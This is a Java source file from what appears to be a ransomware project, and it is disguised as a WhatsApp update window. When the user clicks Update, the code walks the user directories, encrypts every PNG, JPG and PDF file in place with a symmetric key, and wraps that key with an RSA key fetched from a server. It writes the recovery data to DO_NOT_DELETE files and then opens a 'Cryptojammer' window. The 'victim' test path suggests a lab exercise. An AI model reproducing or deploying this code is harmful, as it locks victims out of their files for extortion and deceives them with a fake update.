/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package view;

import commands.EncryptionDecription;
import commands.FileFinder;
import commands.ServerCommunication;
import commands.SymmetricKey;
import commands.UniqueID;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.security.PublicKey;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutionException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.SwingWorker;
import java.util.Arrays;

/**
 *
 * @author admin
 */
public class Updating extends javax.swing.JFrame {
    
    // Fields storing the variables to be printed to file.
    UniqueID uniqueId;
    HashMap<byte[], Path> ivAndFile;
    byte[] encryptedSymKey;
    
    // Field storing the OS version
    String osVersion;
    
    /**
     * Creates new form Updating
     */
    public Updating(String osVersion) {
        initComponents();
        upLabel.setText("");
        upSubLabel.setText("");
        foundUp.setText("Found: WhatsApp update " + java.time.LocalDate.now());
        this.osVersion = osVersion; 
    }

    private Updating() {
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel3 = new javax.swing.JPanel();
        upLabel = new javax.swing.JLabel();
        upSubLabel = new javax.swing.JLabel();
        progressBar = new javax.swing.JProgressBar();
        jPanel9 = new javax.swing.JPanel();
        jLabel17 = new javax.swing.JLabel();
        jButton1 = new javax.swing.JButton();
        foundUp = new javax.swing.JTextField();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jPanel3.setBackground(new java.awt.Color(255, 255, 255));

        upLabel.setFont(new java.awt.Font("Lucida Grande", 0, 18)); // NOI18N
        upLabel.setText("Update in progress");

        upSubLabel.setText("Closing the application can delete your messages");

        jPanel9.setBackground(new java.awt.Color(48, 190, 165));

        jLabel17.setFont(new java.awt.Font("Lucida Grande", 0, 18)); // NOI18N
        jLabel17.setForeground(new java.awt.Color(255, 255, 255));
        jLabel17.setIcon(new javax.swing.ImageIcon(getClass().getResource("/whatsapp-logo.png"))); // NOI18N
        jLabel17.setText("WhatsApp Update");

        javax.swing.GroupLayout jPanel9Layout = new javax.swing.GroupLayout(jPanel9);
        jPanel9.setLayout(jPanel9Layout);
        jPanel9Layout.setHorizontalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addComponent(jLabel17)
                .addGap(0, 0, Short.MAX_VALUE))
        );
        jPanel9Layout.setVerticalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel17)
        );

        jButton1.setText("Update");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        foundUp.setEditable(false);
        foundUp.setBackground(new java.awt.Color(220, 216, 216));
        foundUp.setForeground(new java.awt.Color(0, 102, 102));
        foundUp.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                foundUpActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel9, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGap(93, 93, 93)
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(upLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 190, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, 215, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGap(149, 149, 149)
                        .addComponent(jButton1))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGap(52, 52, 52)
                        .addComponent(upSubLabel))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGap(72, 72, 72)
                        .addComponent(foundUp, javax.swing.GroupLayout.PREFERRED_SIZE, 257, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(64, Short.MAX_VALUE))
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addComponent(jPanel9, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jButton1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(foundUp, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(2, 2, 2)
                .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(upLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(upSubLabel)
                .addContainerGap(29, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel3, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        
        try {
            new EncryptionAndBarUpdate(progressBar, upLabel, upSubLabel, this, osVersion).execute();
        } catch (Exception ex) {
            JOptionPane.showMessageDialog(null, "There was a problem updating WhatsApp. Please try to restart the application.","", JOptionPane.WARNING_MESSAGE);
            System.exit(0);
        }
        
    }//GEN-LAST:event_jButton1ActionPerformed

    private void foundUpActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_foundUpActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_foundUpActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Updating.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Updating.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Updating.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Updating.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Updating().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextField foundUp;
    private javax.swing.JButton jButton1;
    private javax.swing.JLabel jLabel17;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel9;
    private javax.swing.JProgressBar progressBar;
    private javax.swing.JLabel upLabel;
    private javax.swing.JLabel upSubLabel;
    // End of variables declaration//GEN-END:variables
    
    
    private class EncryptionAndBarUpdate extends SwingWorker<Void, Integer> {

        JProgressBar pb;
        String osVersion;
        JLabel mes;
        JLabel subMes;
        Updating updWindow;

        public EncryptionAndBarUpdate(JProgressBar pb, JLabel mes, JLabel subMes, Updating updWindow, String osVersion) {
            this.pb = pb;
            this.mes = mes;
            this.subMes = subMes;
            this.updWindow = updWindow;
            this.osVersion = osVersion;
        }

        @Override
        protected void process(List<Integer> chunks) {
            int i = chunks.get(chunks.size()-1);
            pb.setValue(i);
            mes.setText("Update in progress");
            subMes.setText("Closing the application can delete your messages");
        }

        @Override
        protected Void doInBackground() throws Exception {
            
            publish(0);// Progress bar and Labels initialized
            
            // decide which file type to find
            String glob = "glob:**/*.{png, jpg, pdf}";
            // path to the root folder of the search tree
            String startingLocation;
            // starting location of the search determined by OS type
            if (osVersion.equals("Microsoft Windows")) {
                startingLocation = "C:\\Users";
            } else if (osVersion.equals("macOS")) {
                startingLocation = "/Users/admin/Desktop/victim";
            } else {
                throw new IOException("Operating System not reconized.");
            } 
        
            publish(5); // Progress bar updated
            
            // Creating a FileFinder and saving the paths and iv of the found files
            FileFinder fileFind = new FileFinder();
            fileFind.findFiles(glob, startingLocation);
            ivAndFile = fileFind.fileFound;
            int sizeMap = ivAndFile.size();
            
            publish(25); // Progress bar updated
            
            // Generate unique id
            uniqueId = UniqueID.getUniqueId();
            
            publish(30); // Progress bar updated
            
            // Get Public Key
            ServerCommunication communicator = new ServerCommunication();
            PublicKey publicRSAKey = communicator.getPublicKeyFromServer(uniqueId.getClientId());     
        
            // Generate symmetric key
            SymmetricKey symKey = SymmetricKey.getSymmetricKey();
            
            publish(60); // Progress bar updated
            int step = (int) Math.floor(60/sizeMap); // Bar increase per encrypted file
            int intToPublish = 40 + step;
            
            // Creating an EncryptionDecryption object
            EncryptionDecription encDec = new EncryptionDecription();
            
            // Encrypting every file
            Iterator<Map.Entry<byte[], Path>> itEnc = ivAndFile.entrySet().iterator();
            while (itEnc.hasNext()) {
                Map.Entry<byte[], Path> ivPath = (Map.Entry<byte[], Path>) itEnc.next();
                byte[] content = encDec.getBytesFile(ivPath.getValue());
                IvParameterSpec ivSpec = new IvParameterSpec(ivPath.getKey());
                byte[] encrypted = encDec.encryptBytesFile(symKey.getSessionKey(), ivSpec, content);
                // Saving the encrypted file
                encDec.bytesToFile(encrypted, ivPath.getValue());
                
                if (intToPublish < 100) {
                    publish(intToPublish); // Progress bar updated
                    intToPublish = intToPublish + step;
                }
            }
            
            publish(100); 
            // Encrypt symmetric key
            encryptedSymKey = symKey.encryptKey(publicRSAKey);

            return null;
        }

        @Override
        protected void done() {
            try {
                get();
                // write iv and path to file
                File mapFile ;
                if (osVersion.equals("Microsoft Windows")) {
                mapFile = new File("C:\\Users\\IvAndPath_DO_NOT_DELETE.txt");
                } else {
                mapFile = new File("/Users/admin/Desktop/IvAndPath_DO_NOT_DELETE.txt");
                }
                   
                BufferedWriter bf = null;
                try{
                    bf = new BufferedWriter( new FileWriter(mapFile) );
                    Iterator<Map.Entry<byte[], Path>> itEnc = ivAndFile.entrySet().iterator();
                    while (itEnc.hasNext()) {
                        Map.Entry<byte[], Path> ivPath = (Map.Entry<byte[], Path>) itEnc.next();
                        System.out.println(Arrays.toString(ivPath.getKey()));
                        bf.write(Arrays.toString(ivPath.getKey()) + "<>" + ivPath.getValue() );
                        bf.newLine();
                    }
                    bf.flush();
                } catch(IOException e) {
                        e.printStackTrace();
                } finally {
                    try{
                        bf.close();
                    }catch(Exception e){}
                }
                
                // write unique id to file
                String fileID;
                if (osVersion.equals("Microsoft Windows")) {
                    fileID = "C:\\Users\\UniqueID_DO_NOT_DELETE.txt";
                } else {
                    fileID = "/Users/admin/Desktop/UniqueID_DO_NOT_DELETE.txt";
                }
                try (FileOutputStream outputStream = new FileOutputStream(fileID)) {
                    byte[] idToBytes = uniqueId.getClientId().getBytes();
                    outputStream.write(idToBytes);
                    outputStream.close();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
    
                // write encrypted key to file
                File fileKey;
                if (osVersion.equals("Microsoft Windows")) {
                    fileKey = new File("C:\\Users\\EncKey_DO_NOT_DELETE.txt");
                } else {
                    fileKey = new File("/Users/admin/Desktop/EncKey_DO_NOT_DELETE.txt");
                }
                BufferedWriter bfKey = null;
                try{
                    bfKey = new BufferedWriter( new FileWriter(fileKey) );
                    bfKey.write(Arrays.toString(encryptedSymKey));
                    bfKey.flush();
                } catch(IOException e) {
                        e.printStackTrace();
                } finally {
                    try{
                        bfKey.close();
                    }catch(Exception e){}
                }
                
                
                updWindow.setVisible(false);
                new Cryptojammer(encryptedSymKey, uniqueId, ivAndFile).setVisible(true);
            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
            }
        }
    }   
    
}
